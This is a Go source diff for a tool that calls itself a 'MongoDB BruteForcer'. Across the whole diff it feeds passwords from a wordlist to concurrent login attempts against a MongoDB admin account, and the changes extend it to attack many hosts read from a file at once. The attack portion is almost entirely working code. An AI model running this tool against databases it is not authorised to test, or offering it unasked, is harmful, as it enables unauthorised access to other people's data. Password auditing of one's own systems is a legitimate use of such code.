@@ -11,13 +11,13 @@ import (
 
 var VERBOSE bool
 var PASSFILE string
-var HOSTNAME string
+var HOSTNAMES string
 var DB string
 var USERNAME string
 var THREADS int
 
 var COUNT int
-var TOTAL_WORDS int
+var TOTALWORDS int
 
 func login(db *mgo.Database, user, pass []byte) bool {
 
@@ -36,9 +36,21 @@ func loadPasswords(filename string) [][]byte {
 	}
 	words := bytes.Split(data, []byte{'\n'})
 
-	fmt.Println("Loaded password list! Total words:", len(words))
-	TOTAL_WORDS = len(words)
+	if VERBOSE {
+		fmt.Println("Loaded password list! Total words:", len(words))
+	}
+	TOTALWORDS = len(words)
 	return words
+}
+
+func loadHostnames(filename string) [][]byte {
+	data, err := ioutil.ReadFile(filename)
+	if err != nil {
+		line := []byte("localhost:27017")
+		return [][]byte{line}
+	}
+	hostnames := bytes.Split(data, []byte{'\n'})
+	return hostnames
 }
 
 func sessionBuilder(hostname, dbName string) (*mgo.Session, *mgo.Database) {
@@ -59,8 +71,8 @@ func passwordProducer(filename string, passwordChan chan []byte) {
 	}
 }
  
-func passwordConsumer(id int, user []byte, passwordChan chan []byte) {
-	session, db := sessionBuilder(HOSTNAME, DB)
+func passwordConsumer(id int, hostname string, user []byte, passwordChan chan []byte) {
+	session, db := sessionBuilder(hostname, DB)
 	count := 0
 	defer session.Close()
 
@@ -68,7 +80,7 @@ func passwordConsumer(id int, user []byte, passwordChan chan []byte) {
 		password := <-passwordChan
 
 		if VERBOSE {
-			fmt.Printf("%d:\tcount: %d/%d, %s:%s\n", id, count, COUNT, user, password)
+			fmt.Printf("%d:\t%s, count: %d/%d, %s:%s\n", id, hostname, count, COUNT, user, password)
 		}
 
 		if login(db, user, password) {
@@ -84,19 +96,28 @@ func passwordConsumer(id int, user []byte, passwordChan chan []byte) {
 
 func main () {
 	fmt.Println("-------- MongoDB BruteForcer -------")
-	flag.BoolVar(&VERBOSE, "verbose", false, "display each attempt")
-	flag.StringVar(&HOSTNAME, "hostname", "127.0.0.1", "hostname containing MongoDB")
+	flag.BoolVar(&VERBOSE, "verbose", true, "display each attempt")
+	flag.StringVar(&HOSTNAMES, "hostname", "hosts.hosts", "hostname containing MongoDB")
 	flag.StringVar(&PASSFILE, "passfile", "pass.pass", "location of password file")
 	flag.StringVar(&DB, "database", "admin", "name of database to use")
 	flag.StringVar(&USERNAME, "username", "admin", "username to bruteforce")
-	flag.IntVar(&THREADS, "threads", 16, "number of db connections to use per machine")
+	flag.IntVar(&THREADS, "threads", 4, "number of db connections to use per machine")
 	flag.Parse()
 
 	passwordChannel := make(chan []byte, 10 * THREADS)
 	username := []byte(USERNAME)
 
-	for i := 0; i < THREADS; i++ {
-		go passwordConsumer(i, username, passwordChannel)
+	hostnames := loadHostnames(HOSTNAMES)
+	threadIndex := 0
+	for _, hostname := range hostnames {
+		hostname := string(hostname)
+		if hostname == "" {
+			continue
+		}
+		for i := 0; i < THREADS; i++ {
+			go passwordConsumer(threadIndex, hostname, username, passwordChannel)
+			threadIndex++
+		}
 	}
 	
 	passwordProducer(PASSFILE, passwordChannel)
